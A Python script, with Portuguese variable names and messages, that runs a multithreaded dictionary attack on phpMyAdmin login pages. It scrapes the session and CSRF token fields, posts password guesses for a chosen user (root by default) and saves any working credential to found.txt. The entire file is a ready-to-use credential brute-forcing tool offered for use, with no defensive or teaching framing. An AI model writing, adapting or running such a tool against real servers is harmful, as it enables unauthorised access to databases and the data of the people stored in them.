#!/usr/bin/env python3
import requests
import html
import re
import os
import argparse
import threading
import queue

q = queue.Queue()
x=0

def worker(url, username, th):
	print(f"{th} url: {url}")
	while q.qsize() > 1:
		senha = q.get()
		if login(url, username, senha):
			print(f"[*] FOUND - {username} / {senha}")
			f = open("found.txt", "a+")
			f.write(f" {url} : {username} / {senha}\n")
			f.close()
			os._exit(1)
		else:
			print(f"[{th}][{q.qsize()}] FAILED - {username} / {senha}")
		q.task_done()
	return True


def login(url, username, password):
	for i in range(3):
		try:
			res = requests.get(url)
			cookies = dict(res.cookies)
			data = {
				'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'pma_username': username,
				'pma_password': password,
			}
			res = requests.post(url, cookies=cookies, data=data)
			cookies = dict(res.cookies)
			return 'pmaAuth-1' in cookies
		except:
			pass
	return False

def main():
	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt' % (os.path.basename(__file__)))
	parser.add_argument('-url', help='The URL of target website')
	parser.add_argument('-user', default='root', help='The username of MySQL (default: root)')
	parser.add_argument('-dict', default='password.txt', help='The file path of password dictionary (default: password.txt)')
	parser.add_argument('-threads', default=10, help='Number of active threads (default: 10)')

	args = parser.parse_args()
	url = args.url
	username = args.user
	dictionary = args.dict
	threads = int(args.threads)

	if url is None:
		parser.print_help()
		return

	try:
		f = open(dictionary, "r")
		passwords = f.read().split()
		f.close()
	except:
		print(f"[-] Failed to read '{dictionary}' file.")
		return

	for password in passwords:
		q.put(password)
	print(f"Tamanho da fila: {q.qsize()}")

	for i in range(threads):
		threading.Thread(target=worker, args=(url, username, i)).start()

	q.join()

if __name__ == '__main__':
	main()
